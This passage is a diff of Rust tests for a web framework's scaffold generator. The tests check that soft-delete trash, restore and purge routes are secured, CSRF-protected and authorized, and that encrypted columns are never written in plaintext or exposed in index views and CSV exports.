+    /// Plan a `Post` scaffold with `options` and return the whole plan, so a
+    /// test can read the routes module, `main.rs`, and the smoke test together.
+    fn trash_plan(options: &ScaffoldOptions, extra_fields: &[&str]) -> Plan {
+        let tmp = project_with_main(default_main());
+        let mut fields = bulk_fields();
+        fields.extend(extra_fields.iter().map(|f| (*f).to_owned()));
+        let plan =
+            plan_scaffold_with_options(tmp.path(), "Post", &fields, "20260427000000", options)
+                .unwrap();
+        // Keep the tempdir alive for the duration of the plan's construction
+        // only — every assertion below reads the in-memory action contents.
+        drop(tmp);
+        plan
+    }
+
+    /// The routes module a `--soft-delete` `Post` scaffold emits.
+    fn trash_routes(options: &ScaffoldOptions) -> String {
+        action_contents(&trash_plan(options, &[]), "src/routes/posts.rs")
+    }
+
+    /// The default (standard, non-owner) `--soft-delete` routes module.
+    fn trash_routes_default() -> String {
+        trash_routes(&trash_options(|_| {}))
+    }
+
+    /// Every word the trash surface introduces. Deliberately whole WORDS
+    /// (`trash`, `restore`, `purge`, `only_deleted`) rather than the precise
+    /// call sites: a gated-off variant must carry no trace of the feature at
+    /// all, and matching on the narrow spellings would miss a stray link,
+    /// comment, or doc line that leaked through a gate.
+    const TRASH_WORDS: &[&str] = &[
+        "trash",
+        "Trash",
+        "restore",
+        "Restore",
+        "purge",
+        "Purge",
+        "only_deleted",
+    ];
+
+    fn assert_no_trash_surface(routes: &str, main: &str, label: &str) {
+        for word in TRASH_WORDS {
+            assert!(
+                !routes.contains(word),
+                "{label} must not emit `{word}` anywhere:\n{routes}"
+            );
+        }
+        for entry in ["::trash", "::restore", "::purge"] {
+            assert!(
+                !main.contains(entry),
+                "{label} must not mount `{entry}`:\n{main}"
+            );
+        }
+    }
+
+    #[test]
+    fn soft_delete_emits_trash_route_listing_via_the_only_deleted_scope() {
+        let routes = trash_routes_default();
+        assert!(
+            routes.contains("#[get(\"/posts/trash\")]"),
+            "a --soft-delete scaffold must emit GET /posts/trash:\n{routes}"
+        );
+        let trash = handler_slice(&routes, "trash");
+        assert!(
+            trash.contains("repo.page_only_deleted(&page_req)"),
+            "the trash list must come from the generated only_deleted scope:\n{trash}"
+        );
+        assert!(
+            !trash.contains("deleted_at.is_not_null()"),
+            "the trash list must not hand-roll a deleted_at filter:\n{trash}"
+        );
+    }
+
+    #[test]
+    fn soft_delete_index_links_to_the_trash_view() {
+        let routes = trash_routes_default();
+        let index = handler_slice(&routes, "index");
+        assert!(
+            index.contains("paths::trash()") && index.contains("\"Trash\""),
+            "the index must link to the trash view:\n{index}"
+        );
+    }
+
+    #[test]
+    fn trash_rows_render_csrf_protected_restore_and_purge_controls() {
+        let routes = trash_routes_default();
+        let trash = handler_slice(&routes, "trash");
+        assert!(
+            trash.contains("paths::restore(row.id)"),
+            "each trash row needs a Restore control:\n{trash}"
+        );
+        assert!(
+            trash.contains("paths::purge(row.id)"),
+            "each trash row needs a Purge control:\n{trash}"
+        );
+        assert!(
+            trash.contains("csrf_input(csrf.as_ref(), csrf_field.as_ref())"),
+            "the Restore control must carry the CSRF hidden input:\n{trash}"
+        );
+        assert!(
+            trash.contains("csrf: Option<CsrfToken>"),
+            "the trash handler must extract a CSRF token for its row forms:\n{trash}"
+        );
+        // Issue #1706: a submit control is emitted through the typed `a11y`
+        // primitive, whose constructor requires an accessible name.
+        assert!(
+            trash.contains("autumn_web::a11y::Button::new(\"Restore\").submit()"),
+            "Restore must render through the a11y Button primitive:\n{trash}"
+        );
+        // The confirm dialog is titled per row: one dialog per row means
+        // identical titles would stack indistinguishable headings in the outline
+        // and never tell the user WHICH row they are about to destroy.
+        assert!(
+            trash.contains("format!(\"Permanently delete post {}?\", row.id)"),
+            "the purge dialog must name the row it destroys:\n{trash}"
+        );
+        // Purge confirms through the framework's server-rendered dialog. An
+        // inline `onclick` would be blocked by the default `script-src 'self'`
+        // CSP, so the form would submit with no prompt at all.
+        assert!(
+            trash.contains("autumn_web::widgets::confirm_action(")
+                && trash.contains("ConfirmActionConfig::new()"),
+            "Purge must require an explicit, CSP-safe confirm step:\n{trash}"
+        );
+        assert!(
+            trash.contains("purge_csrf"),
+            "the Purge control must carry a CSRF token:\n{trash}"
+        );
+        assert!(
+            !trash.contains("onclick="),
+            "an inline onclick confirm is blocked by the default CSP:\n{trash}"
+        );
+    }
+
+    #[test]
+    fn restore_handler_is_secured_calls_the_repository_and_returns_to_trash() {
+        let routes = trash_routes_default();
+        assert!(
+            routes.contains("#[secured]\n#[post(\"/posts/{id}/restore\")]"),
+            "restore must be a secured POST route:\n{routes}"
+        );
+        let restore = handler_slice(&routes, "restore");
+        assert!(
+            restore.contains("repo.restore(row.id).await?"),
+            "restore must call the generated repository restore:\n{restore}"
+        );
+        assert!(
+            restore.contains("posts::deleted_at.is_not_null()"),
+            "restore must only reach rows that are actually in the trash:\n{restore}"
+        );
+        assert!(
+            restore.contains("flash.success("),
+            "restore must surface a flash confirmation:\n{restore}"
+        );
+        assert!(
+            restore.contains("Redirect::to(&paths::trash())"),
+            "restore must redirect back to the trash view:\n{restore}"
+        );
+    }
+
+    #[test]
+    fn purge_handler_is_secured_calls_the_repository_and_returns_to_trash() {
+        let routes = trash_routes_default();
+        assert!(
+            routes.contains("#[secured]\n#[post(\"/posts/{id}/purge\")]"),
+            "purge must be a secured POST route:\n{routes}"
+        );
+        let purge = handler_slice(&routes, "purge");
+        assert!(
+            purge.contains("repo.purge(row.id).await?"),
+            "purge must call the generated repository purge:\n{purge}"
+        );
+        assert!(
+            purge.contains("posts::deleted_at.is_not_null()"),
+            "purge must never hard-delete a live row:\n{purge}"
+        );
+        assert!(
+            !purge.contains("diesel::delete("),
+            "purge must route the hard delete through the repository:\n{purge}"
+        );
+        assert!(
+            purge.contains("flash.success("),
+            "purge must surface a flash confirmation:\n{purge}"
+        );
+        assert!(
+            purge.contains("Redirect::to(&paths::trash())"),
+            "purge must redirect back to the trash view:\n{purge}"
+        );
+    }
+
+    #[test]
+    fn restore_and_purge_record_authorize_the_row_they_load() {
+        let routes = trash_routes_default();
+        for name in ["restore", "purge"] {
+            let handler = handler_slice(&routes, name);
+            assert!(
+                handler.contains(
+                    "autumn_web::authorization::authorize::<Post>(&state, &session, \"delete\", &row)"
+                ),
+                "{name} must record-authorize its target row:\n{handler}"
+            );
+        }
+    }
+
+    #[test]
+    fn trash_surface_is_exported_through_the_typed_paths_module() {
+        let routes = trash_routes_default();
+        for name in ["    trash,", "    restore,", "    purge,"] {
+            assert!(
+                routes.contains(name),
+                "the paths! block must export `{name}`:\n{routes}"
+            );
+        }
+    }
+
+    #[test]
+    fn trash_surface_is_mounted_in_main_rs() {
+        let plan = trash_plan(&trash_options(|_| {}), &[]);
+        let main = action_contents(&plan, "src/main.rs");
+        for entry in [
+            "routes::posts::trash",
+            "routes::posts::restore",
+            "routes::posts::purge",
+        ] {
+            assert!(
+                main.contains(entry),
+                "main.rs must mount `{entry}`:\n{main}"
+            );
+        }
+    }
+
+    #[test]
+    fn soft_delete_smoke_test_exercises_the_full_trash_lifecycle() {
+        let plan = trash_plan(&trash_options(|_| {}), &[]);
+        let test_src = action_contents(&plan, "tests/post.rs");
+        assert!(
+            test_src.contains("async fn posts_trash_restore_purge_lifecycle()"),
+            "a --soft-delete scaffold must generate the trash lifecycle test:\n{test_src}"
+        );
+        for step in [
+            "/posts/1/delete",
+            "/posts/trash",
+            "/posts/1/restore",
+            "/posts/1/purge",
+        ] {
+            assert!(
+                test_src.contains(step),
+                "the lifecycle test must exercise `{step}`:\n{test_src}"
+            );
+        }
+    }
+
+    #[test]
+    fn scaffold_without_soft_delete_emits_no_trash_surface() {
+        let plan = trash_plan(&ScaffoldOptions::default(), &[]);
+        assert_no_trash_surface(
+            &action_contents(&plan, "src/routes/posts.rs"),
+            &action_contents(&plan, "src/main.rs"),
+            "a scaffold without --soft-delete",
+        );
+        let test_src = action_contents(&plan, "tests/post.rs");
+        assert!(
+            !test_src.contains("trash"),
+            "a scaffold without --soft-delete must generate no trash test:\n{test_src}"
+        );
+    }
+
+    #[test]
+    fn gated_off_soft_delete_variants_emit_no_trash_surface() {
+        // `--live` / `--live-validation`: a restore bypasses the repository's
+        // broadcasting `save`, so the SSE list would never learn about the row.
+        // `--sharded`: `page_only_deleted` refuses to fan out, so a trash page
+        // would silently show one shard's deletions.
+        let cases: [(&str, ScaffoldOptions, &[&str]); 4] = [
+            ("--live", trash_options(|o| o.live = true), &[]),
+            (
+                "--live-validation",
+                trash_options(|o| o.live_validation = true),
+                &[],
+            ),
+            ("--sharded", trash_options(|o| o.model.sharded = true), &[]),
+            // An owner-scoped index has no owner-filtered deleted-rows scope to
+            // list through, and re-deriving the owner filter by hand in a second
+            // handler is exactly how a list endpoint leaks another user's rows.
+            ("owner-scoped", trash_options(|_| {}), &["user:references"]),
+        ];
+        for (label, options, extra_fields) in cases {
+            let plan = trash_plan(&options, extra_fields);
+            assert_no_trash_surface(
+                &action_contents(&plan, "src/routes/posts.rs"),
+                &action_contents(&plan, "src/main.rs"),
+                label,
+            );
+        }
+    }
+
+    /// The trash gate is computed TWICE — once in `plan_scaffold_with_options_impl`
+    /// (which decides what `main.rs` mounts and whether the lifecycle test is
+    /// appended) and once in `render_routes_file` (which decides what the routes
+    /// module emits). If they ever disagree, the generated app either mounts a
+    /// handler that does not exist — it will not compile — or emits dead code
+    /// nothing routes to. Rather than trusting the two comments that say "must
+    /// agree", check the actual outputs against each other across the whole flag
+    /// matrix.
+    #[test]
+    fn the_mounted_trash_routes_always_match_the_emitted_ones() {
+        /// One scaffold flag, applied to the options under test.
+        type Toggle = fn(&mut ScaffoldOptions);
+        let toggles: [(&str, Toggle); 7] = [
+            ("api", |o| o.api = true),
+            ("live", |o| o.live = true),
+            ("live_validation", |o| o.live_validation = true),
+            ("sharded", |o| o.model.sharded = true),
+            ("no_policy", |o| o.no_policy = true),
+            ("searchable", |o| {
+                o.model.searchable = vec!["title".to_owned()];
+            }),
+            ("soft_delete", |o| o.model.soft_delete = true),
+        ];
+        // Guard against the loop degenerating into a no-op: if a future planner
+        // change starts refusing most of the matrix (or the `else { continue }`
+        // below starts swallowing everything), the counters catch it rather than
+        // letting a green test cover nothing.
+        let mut planned = 0usize;
+        let mut with_trash = 0usize;
+        // Every subset of the toggles, crossed with "does the model carry an
+        // owner column" (which is what makes the index owner-scoped).
+        for mask in 0u32..(1 << toggles.len()) {
+            for owner in [false, true] {
+                let mut options = ScaffoldOptions::default();
+                let mut label: Vec<&str> = Vec::new();
+                for (bit, (name, apply)) in toggles.iter().enumerate() {
+                    if mask & (1 << bit) != 0 {
+                        apply(&mut options);
+                        label.push(name);
+                    }
+                }
+                if owner {
+                    label.push("owner");
+                }
+                // `--searchable` on an owner-scoped `--sharded` scaffold is
+                // refused outright (issue #1841), as is `--live` + searchable
+                // owner scoping; skip whatever the planner rejects rather than
+                // asserting on an error case this test is not about.
+                let extra_fields: &[&str] = if owner { &["user:references"] } else { &[] };
+                let tmp = project_with_main(default_main());
+                let mut fields = bulk_fields();
+                fields.extend(extra_fields.iter().map(|f| (*f).to_owned()));
+                let Ok(plan) = plan_scaffold_with_options(
+                    tmp.path(),
+                    "Post",
+                    &fields,
+                    "20260427000000",
+                    &options,
+                ) else {
+                    continue;
+                };
+                planned += 1;
+                let routes = action_contents(&plan, "src/routes/posts.rs");
+                let main = action_contents(&plan, "src/main.rs");
+                let label = label.join("+");
+                if routes.contains("pub async fn trash(") {
+                    with_trash += 1;
+                }
+                for name in ["trash", "restore", "purge"] {
+                    let emitted = routes.contains(&format!("pub async fn {name}("));
+                    let mounted = main.contains(&format!("routes::posts::{name}"));
+                    assert_eq!(
+                        emitted, mounted,
+                        "[{label}] `{name}` is emitted={emitted} but mounted={mounted} — \
+                         the two gates disagree, so the generated app would not compile"
+                    );
+                }
+                // The generated lifecycle test is appended under the same gate,
+                // so it must track the handlers too — a test posting to routes
+                // the scaffold never emitted documents a lie.
+                let test_src = action_contents(&plan, "tests/post.rs");
+                assert_eq!(
+                    routes.contains("pub async fn trash("),
+                    test_src.contains("trash_restore_purge_lifecycle"),
+                    "[{label}] the generated lifecycle test must track the trash handlers"
+                );
+            }
+        }
+        assert!(
+            planned > 200,
+            "the flag matrix should plan most of its {} combinations, planned {planned}",
+            2 << toggles.len()
+        );
+        assert!(
+            with_trash > 0,
+            "the matrix must include combinations that DO emit the trash surface, \
+             otherwise it only proves the feature is always off"
+        );
+    }
+
+    #[test]
+    fn regenerating_without_soft_delete_unmounts_the_trash_routes() {
+        let tmp = project_with_main(default_main());
+        // First run: the trash surface is mounted.
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &bulk_fields(),
+            "20260427000000",
+            &trash_options(|_| {}),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let main = fs::read_to_string(tmp.path().join("src/main.rs")).unwrap();
+        assert!(main.contains("routes::posts::trash"), "{main}");
+
+        // Second run WITHOUT the flag — the shape people land on when they
+        // re-scaffold and forget to repeat it. `update_main_rs` only adds, so
+        // without the prune the three entries would survive pointing at
+        // handlers the fresh routes module no longer defines, and the generated
+        // project would stop compiling.
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &bulk_fields(),
+            "20260427000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap()
+        .execute(Flags {
+            force: true,
+            ..Default::default()
+        })
+        .unwrap();
+        let main = fs::read_to_string(tmp.path().join("src/main.rs")).unwrap();
+        for entry in [
+            "routes::posts::trash",
+            "routes::posts::restore",
+            "routes::posts::purge",
+        ] {
+            assert!(
+                !main.contains(entry),
+                "regenerating without --soft-delete must unmount `{entry}`:\n{main}"
+            );
+        }
+        // The routes that ARE still emitted stay mounted.
+        assert!(main.contains("routes::posts::destroy"), "{main}");
+    }
+
+    #[test]
+    fn destroying_without_soft_delete_unmounts_the_trash_routes() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &bulk_fields(),
+            "20260427000000",
+            &trash_options(|_| {}),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+
+        // `autumn destroy scaffold Post` without repeating `--soft-delete` —
+        // the flag was typed once, days ago. The revert deletes the routes
+        // module, so any trash entry it leaves behind in `main.rs` points at a
+        // module that no longer exists and the remaining app stops compiling.
+        plan_scaffold_with_options_for_revert(
+            tmp.path(),
+            "Post",
+            &bulk_fields(),
+            "20260427000000",
+            &ScaffoldOptions::default(),
+        )
+        .unwrap()
+        .revert(Flags {
+            force: true,
+            ..Flags::default()
+        })
+        .unwrap();
+
+        let main = fs::read_to_string(tmp.path().join("src/main.rs")).unwrap();
+        for entry in [
+            "routes::posts::trash",
+            "routes::posts::restore",
+            "routes::posts::purge",
+            // The rest of the resource's entries come off the same way.
+            "routes::posts::index",
+            "routes::posts::destroy",
+        ] {
+            assert!(
+                !main.contains(entry),
+                "destroy without --soft-delete must unmount `{entry}`:\n{main}"
+            );
+        }
+    }
+
+    #[test]
+    fn soft_delete_slug_scaffold_reserves_the_trash_segment() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+            &trash_options(|_| {}),
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        // `GET /posts/trash` is a static sibling of `GET /posts/{slug}`, and the
+        // router always prefers the static one — so a post titled "Trash" whose
+        // slug derives to `trash` would be permanently unreachable at its own
+        // show page. The derived-slug collision probe must treat it as taken,
+        // exactly as it already does for `new` (and `search`).
+        assert!(
+            routes.contains("candidate != \"trash\""),
+            "a soft-delete slug scaffold must reserve the `trash` segment:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn scaffold_without_trash_view_does_not_reserve_the_trash_segment() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "slug:slug{from:title}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(
+            !routes.contains("candidate != \"trash\""),
+            "a scaffold with no trash route must not reserve the segment:\n{routes}"
+        );
+    }
+
+    #[test]
+    fn soft_delete_destroy_flash_says_where_the_row_went() {
+        // With a Trash page in the app, "deleted" is no longer what happened.
+        assert!(
+            trash_routes_default().contains(r#"flash.success("Post moved to Trash")"#),
+            "a soft-delete scaffold with a trash view must say the row moved there"
+        );
+        // Without one there is nowhere to point the user, so the wording stays.
+        let plain = trash_routes(&trash_options(|o| o.model.sharded = true));
+        assert!(
+            plain.contains(r#"flash.success("Post deleted")"#),
+            "a scaffold with no trash view keeps the original delete wording"
+        );
+    }
+
+    #[test]
+    fn soft_delete_without_a_trash_view_warns_and_says_why() {
+        // Every gated-off variant explains itself at generation time rather than
+        // leaving the author to notice the missing Trash link.
+        let cases: [(&str, ScaffoldOptions, &[&str]); 4] = [
+            ("--api", trash_options(|o| o.api = true), &[]),
+            ("--live", trash_options(|o| o.live = true), &[]),
+            ("--sharded", trash_options(|o| o.model.sharded = true), &[]),
+            ("owner-scoped", trash_options(|_| {}), &["user:references"]),
+        ];
+        for (label, options, extra_fields) in cases {
+            let plan = trash_plan(&options, extra_fields);
+            assert!(
+                plan.warnings
+                    .iter()
+                    .any(|w| w.contains("no Trash view generated for posts")),
+                "{label} must warn that --soft-delete generated no trash view: {:?}",
+                plan.warnings
+            );
+        }
+        // A scaffold that DOES get the trash view says nothing about it.
+        let plan = trash_plan(&trash_options(|_| {}), &[]);
+        assert!(
+            !plan.warnings.iter().any(|w| w.contains("Trash")),
+            "a scaffold that gets the trash view must not warn: {:?}",
+            plan.warnings
+        );
+    }
+
+    #[test]
+    fn api_soft_delete_scaffold_emits_no_trash_surface() {
+        let plan = trash_plan(&trash_options(|o| o.api = true), &[]);
+        // `--api` emits no HTML routes module at all; the guard here is that
+        // `main.rs` mounts nothing from one either.
+        let main = action_contents(&plan, "src/main.rs");
+        for entry in ["::trash", "::restore", "::purge"] {
+            assert!(
+                !main.contains(entry),
+                "an --api scaffold must not mount `{entry}`:\n{main}"
+            );
+        }
+    }
+
+    // ── `{encrypted}` at-rest column encryption (issue #1340) ───────────────
+
+    /// AC3/AC5 end-to-end: a scaffolded `{encrypted}` column lands as
+    /// `#[encrypted]` on the model, `TEXT` in the migration, and a plain
+    /// `String` on the struct — with the non-encrypted sibling untouched.
+    #[test]
+    fn scaffold_encrypted_field_emits_attribute_and_text_column() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &[
+                "username:String".into(),
+                "api_token:String{encrypted}".into(),
+                "email:String{encrypted:deterministic}".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+
+        let model = fs::read_to_string(tmp.path().join("src/models/account.rs")).unwrap();
+        assert!(
+            model.contains("#[encrypted]\n    pub api_token: String,"),
+            "model: {model}"
+        );
+        assert!(
+            model.contains("#[encrypted(deterministic)]\n    pub email: String,"),
+            "model: {model}"
+        );
+        assert!(model.contains("pub username: String,"), "model: {model}");
+
+        let up = fs::read_to_string(
+            tmp.path()
+                .join("migrations/20260427000000_create_accounts/up.sql"),
+        )
+        .unwrap();
+        assert!(up.contains("api_token TEXT NOT NULL"), "up.sql: {up}");
+        assert!(up.contains("email TEXT NOT NULL"), "up.sql: {up}");
+    }
+
+    /// AC6 (`--query` half): a derived equality lookup on a RANDOMIZED
+    /// encrypted column compiles but fails at runtime with
+    /// `EncryptionError::RandomizedEqualityLookup`. Refuse at generate time.
+    #[test]
+    fn scaffold_query_on_randomized_encrypted_field_is_rejected() {
+        let tmp = project_with_main(default_main());
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Account",
+            &["api_token:String{encrypted}".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                queries: vec!["find_by_api_token:api_token".into()],
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap_err();
+        let msg = err.to_string();
+        assert!(msg.contains("api_token"), "must name the field: {msg}");
+        assert!(
+            msg.contains("deterministic"),
+            "must point at the fix: {msg}"
+        );
+    }
+
+    /// The deterministic mode is exactly what makes the lookup legal — the
+    /// repository macro encodes the bound parameter through the encrypted-column
+    /// registry at runtime, so `find_by_email` matches stored ciphertext.
+    #[test]
+    fn scaffold_query_on_deterministic_encrypted_field_is_allowed() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Account",
+            &["email:String{encrypted:deterministic}".into()],
+            "20260427000000",
+            &ScaffoldOptions {
+                queries: vec!["find_by_email:email".into()],
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+        let repo = fs::read_to_string(tmp.path().join("src/repositories/account.rs")).unwrap();
+        assert!(
+            repo.contains("fn find_by_email(email: String) -> Vec<Account>;"),
+            "repo: {repo}"
+        );
+    }
+
+    /// A `:unique` deterministic encrypted column still gets its free
+    /// `find_by_<col>` and its `CREATE UNIQUE INDEX` (the index enforces real
+    /// plaintext uniqueness because equal plaintext yields equal ciphertext).
+    #[test]
+    fn scaffold_unique_deterministic_encrypted_field_keeps_find_by_and_index() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &["email:String{encrypted:deterministic}:unique".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        plan.execute(Flags::default()).unwrap();
+        let repo = fs::read_to_string(tmp.path().join("src/repositories/account.rs")).unwrap();
+        assert!(
+            repo.contains("fn find_by_email(email: String) -> Vec<Account>;"),
+            "repo: {repo}"
+        );
+        let up = fs::read_to_string(
+            tmp.path()
+                .join("migrations/20260427000000_create_accounts/up.sql"),
+        )
+        .unwrap();
+        assert!(
+            up.contains("CREATE UNIQUE INDEX idx_accounts_email_unique ON accounts (email);"),
+            "up.sql: {up}"
+        );
+    }
+
+    /// R11: the index table must not advertise a sortable header for an
+    /// encrypted column — the server would order by base64 ciphertext, which
+    /// bears no relation to the plaintext order the header link promises.
+    #[test]
+    fn scaffold_encrypted_column_is_not_sortable_in_the_index() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &[
+                "username:String".into(),
+                "api_token:String{encrypted}".into(),
+                "email:String{encrypted:deterministic}".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/accounts.rs");
+        assert!(
+            routes.contains(r#".sortable("username")"#),
+            "a plain column stays sortable: {routes}"
+        );
+        assert!(
+            !routes.contains(r#".sortable("api_token")"#),
+            "a randomized encrypted column must not render a sort link: {routes}"
+        );
+        assert!(
+            !routes.contains(r#".sortable("email")"#),
+            "a deterministic encrypted column must not render a sort link: {routes}"
+        );
+    }
+
+    /// R12: the scaffold's next-steps must tell the developer to provision key
+    /// material, or the first write to the new resource fails at runtime.
+    #[test]
+    fn scaffold_with_encrypted_field_warns_about_key_material() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &["api_token:String{encrypted}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        assert!(
+            plan.warnings
+                .iter()
+                .any(|w| w.contains("autumn credentials edit")
+                    && w.contains("active_record_encryption.primary_key")),
+            "warnings: {:?}",
+            plan.warnings
+        );
+    }
+
+    /// The scaffold's standard (raw-diesel) `update` handler writes a `.set((…))`
+    /// tuple built from the submitted form. For an encrypted column that tuple
+    /// must bind the value through the encrypting diesel wrapper — a bare
+    /// `col.eq(new.col)` would store the **plaintext** in a column the reader
+    /// then tries to decrypt, which is both a silent data leak and a guaranteed
+    /// `MalformedEnvelope` on the next read. This is the single most important
+    /// assertion in the slice: the whole point of `{encrypted}` is that no
+    /// scaffolded path ever writes plaintext.
+    #[test]
+    fn scaffold_update_binds_encrypted_columns_through_the_encrypting_wrapper() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &[
+                "username:String".into(),
+                "api_token:String{encrypted}".into(),
+                "email:String{encrypted:deterministic}".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/accounts.rs");
+
+        assert!(
+            routes.contains(
+                "accounts::api_token.eq(autumn_web::encryption::RandomizedText::from(new.api_token.clone()))"
+            ),
+            "a randomized column must bind through `RandomizedText`:\n{routes}"
+        );
+        assert!(
+            routes.contains(
+                "accounts::email.eq(autumn_web::encryption::DeterministicText::from(new.email.clone()))"
+            ),
+            "a deterministic column must bind through `DeterministicText`:\n{routes}"
+        );
+        // The bare, plaintext-writing form must appear nowhere for either column.
+        assert!(
+            !routes.contains("accounts::api_token.eq(new.api_token.clone())"),
+            "the plaintext bind must not survive anywhere:\n{routes}"
+        );
+        assert!(
+            !routes.contains("accounts::email.eq(new.email.clone())"),
+            "the plaintext bind must not survive anywhere:\n{routes}"
+        );
+        // A plaintext column keeps the ordinary bind, byte-for-byte.
+        assert!(
+            routes.contains("accounts::username.eq(new.username.clone())"),
+            "a plaintext column must be unaffected:\n{routes}"
+        );
+    }
+
+    /// `#[diesel(serialize_as = …)]` consumes the value, so diesel implements
+    /// `Insertable` only for the OWNED `New{Model}` — never `&New{Model}`. The
+    /// scaffold's insert must therefore pass the record by value when the model
+    /// has an encrypted column, or the generated app does not compile.
+    #[test]
+    fn scaffold_insert_passes_owned_record_when_a_column_is_encrypted() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &["api_token:String{encrypted}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/accounts.rs");
+        assert!(
+            routes.contains(".values(new)"),
+            "an encrypted scaffold must insert the owned record:\n{routes}"
+        );
+        assert!(
+            !routes.contains(".values(&new)"),
+            "`&New` is not `Insertable` once a column uses `serialize_as`:\n{routes}"
+        );
+    }
+
+    /// …and a scaffold with no encrypted column keeps the borrowed insert it has
+    /// always emitted, byte-for-byte.
+    #[test]
+    fn unencrypted_scaffold_keeps_the_borrowed_insert() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Post",
+            &["title:String".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/posts.rs");
+        assert!(routes.contains(".values(&new)"), "routes:\n{routes}");
+    }
+
+    /// The nested (`--belongs-to`) create handler writes through the same raw
+    /// diesel insert, so it needs the same owned record.
+    #[test]
+    fn nested_scaffold_insert_passes_owned_record_when_a_column_is_encrypted() {
+        let tmp = project_with_scaffolded_parent();
+        let plan = plan_scaffold_with_options(
+            tmp.path(),
+            "Token",
+            &["post:references".into(), "secret:String{encrypted}".into()],
+            "20260428000000",
+            &belongs_to_options(),
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/tokens.rs");
+        assert!(
+            !routes.contains(".values(&new)"),
+            "the nested create must not borrow an encrypted record:\n{routes}"
+        );
+        assert!(routes.contains(".values(new)"), "routes:\n{routes}");
+    }
+
+    /// Review finding: the scaffolded `GET /{plural}/export.csv` streamed the
+    /// DECRYPTED value of every encrypted column into a file that then leaves
+    /// the app entirely. `autumn-admin-plugin`'s own `csv_export_columns`
+    /// already filters `!f.encrypted`; the scaffold now matches it.
+    #[test]
+    fn scaffold_csv_export_omits_encrypted_columns() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &[
+                "username:String".into(),
+                "api_token:String{encrypted}".into(),
+                "email:String{encrypted:deterministic}".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/accounts.rs");
+
+        assert!(
+            routes.contains(r#"&["id", "username", "created_at"]"#),
+            "the CSV header row must omit both encrypted columns:\n{routes}"
+        );
+        for leaked in ["self.api_token", "self.email"] {
+            assert!(
+                !routes.contains(leaked),
+                "an encrypted column must not reach `to_csv_record`: `{leaked}`\n{routes}"
+            );
+        }
+        // The plaintext column still exports, still through the formula guard.
+        assert!(
+            routes.contains("csv_text_cell(self.username.clone())"),
+            "routes:\n{routes}"
+        );
+    }
+
+    /// …and a scaffold whose ONLY text column is encrypted must not emit the
+    /// now-unused `csv_text_cell` helper: an unused `fn` is a `dead_code`
+    /// warning, and the scaffold's contract is warning-free generated code.
+    #[test]
+    fn scaffold_csv_export_drops_the_formula_guard_when_only_encrypted_text_remains() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &["views:i64".into(), "api_token:String{encrypted}".into()],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/accounts.rs");
+        assert!(
+            !routes.contains("fn csv_text_cell"),
+            "no exported column is text-backed, so the guard must not be emitted:\n{routes}"
+        );
+    }
+
+    /// Review finding: the index table rendered every row's decrypted secret.
+    /// A list is a bulk-disclosure surface, so the cell is redacted; the
+    /// single-record `show` view still renders the real value.
+    #[test]
+    fn scaffold_index_redacts_encrypted_cells_but_show_does_not() {
+        let tmp = project_with_main(default_main());
+        let plan = plan_scaffold(
+            tmp.path(),
+            "Account",
+            &[
+                "username:String".into(),
+                "api_token:String{encrypted}".into(),
+            ],
+            "20260427000000",
+        )
+        .unwrap();
+        let routes = action_contents(&plan, "src/routes/accounts.rs");
+
+        // Index column: redacted, and the closure binds `_row` so the generated
+        // app stays warning-free.
+        assert!(
+            routes.contains(
+                "Column::new(\"Api Token\", |_row: &Account| maud::html! { (\"••••••••\") })"
+            ),
+            "the index cell must be redacted:\n{routes}"
+        );
+        // Show view: the real value, because the reader routed to one record.
